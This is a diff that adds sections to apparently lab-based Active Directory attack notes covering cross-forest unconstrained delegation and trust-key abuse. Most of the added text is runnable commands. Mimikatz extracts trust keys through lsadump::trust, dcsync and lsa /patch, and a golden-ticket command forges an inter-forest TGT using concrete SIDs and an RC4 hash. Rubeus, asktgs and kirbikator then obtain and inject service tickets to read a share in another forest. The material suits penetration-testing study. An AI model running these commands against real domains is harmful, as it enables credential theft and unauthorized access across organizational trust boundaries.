@@ -206,7 +206,72 @@ C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.l
 
 
 
+## Cross Forest - Unconstrained Delegation
 
+### Description
+
+* Recall the Printer bug and its abuse from a machine with Unconstrained Delegation. This can be used even accross the forest!
+* We have used it to escalate privileges to Domain Admin and Enterprise Admin.&#x20;
+* It also works across a Two-way forest trust with TGT Delegation enabled!
+* TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.&#x20;
+* In the lab, TGTDelegation is set from usvendor.local to techcorp.local (but not set for the other direction).
+
+### Tool
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>1. To enumerate if TGTDelegation is enabled across a forest trust, run the below
+</strong>command from a DC!!
+netdom trust trustingforest /domain:trustedforest /EnableTgtDelegation
+<strong>
+</strong>Get-ADTrust -server usvendor.local -Filter *
+<strong>
+</strong>e.g In the lab, this is to be run on usvendor-dc netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation 
+The PowerShell cmdlets of the ADModule seems to have a bug, the command shows TGTDelegation set to False when run from non-dc. But when run from usvendor-dc, it shows TGTDelegation to be True. 
+<strong>
+</strong></code></pre>
+
+
+
+## Cross Forest - Trust Key
+
+### Description
+
+* By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary. &#x20;
+* We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.&#x20;
+* Let's try to access a file share 'eushare' on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.&#x20;
+* Note that we are hopping trusts from us.techcrop.local to eu.local to euvendor.local!
+
+### Requirement
+
+* Compromised DC
+
+### Tools
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Like intra forest scenario, we require the trust key for the inter-forest trust.
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+or
+Invoke-Mimikatz -Command '"lsadump::dcsync
+/user:eu\euvendor$"'   // /user:domain/netbiosNameofRemoteForest
+or
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+<strong>
+</strong><strong>We can also use any of the earlier discussed tools to extract trust keys.
+</strong><strong>
+</strong><strong>Forge an inter-forest TGT
+</strong>Invoke-Mimikatz -Command '"kerberos::golden/user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"' 
+(/rc4 is the trust key; called Hash NTLM in the above output)
+
+Get a TGS for a service (CIFS below) in the target forest by using the forged trust
+ticket.
+.\Rubeus.exe aktgs /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi /service:CIFS/euvendordc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+.\asktgs.exe C:\AD\Tools\kekeo_old\sharedwitheu.kirbi CIFS/euvendordc.euvendor.local
+
+Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for
+PowerShell Remoting and WinRM) can be created as well.  
+
+Use the TGS to access the target resource which must be explicitly shared:
+.\kirbikator.exe lsa CIFS.euvendordc.euvendor.local.kirbi
+ls \\euvendor-dc.euvendor.local\eushare\
+</code></pre>
 
 ## AD Certificate Service (CS)
 
